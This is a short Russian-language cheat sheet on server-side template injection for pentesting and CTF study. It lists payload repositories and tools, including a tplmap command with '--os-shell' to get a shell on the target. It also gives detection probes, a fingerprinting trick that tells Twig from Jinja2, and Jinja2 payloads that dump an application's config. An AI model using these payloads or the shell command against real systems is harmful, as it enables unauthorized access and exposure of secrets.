SSTI - уязвимость веб-приложений, при которой атакующий внедряет код в шаблоны на стороне сервера.
## Источники
- [PayloadAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks SSTI](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
- [ssti-advanced-payload-list](https://github.com/payload-box/ssti-advanced-payload-list)
- [template-injection-table](https://github.com/Hackmanit/template-injection-table) - полезные нагрузки (полиглоты), подходящие к большинству шаблонизаторов
## Инструменты
- [SSTImap](https://github.com/vladko312/SSTImap) - Automatic SSTI detection tool with interactive interface
- [TInjA](https://github.com/Hackmanit/TInjA)
- [tplmap](https://github.com/epinna/tplmap): `python3 tplmap.py -u <host> --os-shell`
## Обнаружение
Определение шаблонизатора:
![[SSTI_Decision_Tree.png]]
На полезную нагрузку `{{7*'7'}}` Twig выдаст `49`, Jinja2 – `7777777`.
Примеры ввода для поиска SSTI:
```
${{<%[%'"}}%\.
{{7*7}} 
${7*7} 
<%= 7*7%> 
${{7*7}} 
#{7*7} 
*{7*7}
}}<tag>
```
## Jinja2
### Получение конфига
[TokyoWesterns CTF 4th 2018 / Shrine / Writeup](https://ctftime.org/writeup/10895):
```
{{ config }}
{{ self.__init__.__globals__['config'] }}
{{ url_for.__globals__['current_app'].config }}
{{ get_flashed_messages.__globals__['current_app'].config }}
```